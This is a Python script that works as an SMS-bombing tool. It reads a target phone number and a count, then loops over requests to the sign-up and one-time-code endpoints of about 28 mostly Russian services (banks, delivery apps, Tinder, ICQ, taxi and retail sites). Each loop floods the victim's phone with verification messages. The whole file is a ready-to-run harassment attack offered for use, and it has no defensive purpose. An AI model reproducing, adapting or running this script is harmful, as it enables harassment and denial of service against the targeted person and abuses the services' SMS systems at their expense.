import requests
num = input('Enter Target Number --->  ')
lim = int(input('Enter Limit --->   '))
numplus = '+' + num
def spam():
	try:
		print(requests.post("http://mobile-api.metropolis.moscow/v1/register",data = {'phone': num}))
		print(requests.post("http://mobile-api.metropolis.moscow/v1/send-code", data = {'phone': num}))
		print(requests.post("http://api.rozamira-azs.ru/v1/auth", data = {'login': num}))
		print(requests.post("http://app.maheev.org/LMA/registration/registrate_client?birthday=14.02.2001&patronymic=Dd&phone="+num+"&surname=Ffr&sex=1&name=Df"))
		print(requests.post("http://milano-engels.ru/ajax/loginPhone?ssid=d7f1f5ba-578d-4380-9adc-5031ce3aa0be&mobileApp=true&restaurant=edebbe6f-fa2a-4a49-bfb5-e301deee47c5&phone=+"+num+"&country=RU"))
		print(requests.get("https://suandshi.ru/mobile_api/register_mobile_user?phone="+num[1:]))
		print(requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data = {'phone': num , 'device': 'Windows+v.43+Chrome+v.7453451', 'app_version': '870'}))
		print(requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json = {'phone': num , 'otpId': 0}))
		print(requests.post('https://api.tinkoff.ru/v1/sign_up', data = {'phone': numplus}))
		print(requests.post('https://www.delivery-club.ru/ajax/user_otp', data = {'phone': num }))
		print(requests.post('https://findclone.ru/register?phone={}'.format(num)))
		print(requests.post('https://api.kfc.com/api/users/v1/user.verify', json = {"device":{"deviceId":"new_kfc_web_site","deviceType":"mobile"}, "createdAt":"2020-02-15T16:48:04.172Z", "phone": numplus}))
		print(requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': numplus}))
		print(requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":numplus}))
		print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":numplus}))
		print(requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num)))
		print(requests.post('https://kapibaras.ru/api/lk/sendCode', json = {"phone": numplus,"city":1}))
		print(requests.post('https://api.mtstv.ru/v1/users', json = {"msisdn": num}))
		print(requests.post('https://api-user.privetmir.ru/api/v2/send-code', data = {"back_url": "/register/step-2/", "scope": "register-user reset-password", "login": numplus, "checkApproves":"Y","approve1":"on","approve2":"on"}))
		print(requests.post('https://moscow.rutaxi.ru/ajax_keycode.html?qip=1206982388733687&lang=ru&source=0', data = {"l": num}))
		print(requests.post('https://rutube.ru/api/accounts/sendpass/phone', data = {"phone": numplus}))
		print(requests.post('https://api.sunlight.net/v3/customers/authorization/', data = {"phone":num}))
		print(requests.post('https://api.iconjob.co/api/auth/verification_code', data = {"phone": num}))
		print(requests.get('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone=' + num))
		headers = {'Content-type': 'application/json'}
		print(requests.post('https://app.karusel.ru/api/v1/phone_free/', json = {"phone": num }, headers = headers))
		print(requests.get('https://zoloto585.ru/registraciya_karty/sms.php?get_sms=1&type=new&fn=%D0%92%D0%90%D0%A1%D0%98%D0%9B%D0%AC%D0%95%D0%92%D0%90&sn=%D0%98%D0%A0%D0%98%D0%9D%D0%90&tn=%D0%9A%D0%90%D0%A0%D0%98%D0%9D%D0%9E%D0%92%D0%9D%D0%90&sex=1&dd=12.12.1990&sl=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0&phone=%2B' + num + '&email=edfsfsdgf%40mail.ru'))
		print(requests.post("http://194.58.90.105/v1/me/registration?phone=" + num,timeout=2))
	except Exception as err:
            print('err at service', err)
		
for i in range(0,lim):
	spam()
	print('Attack starting.')
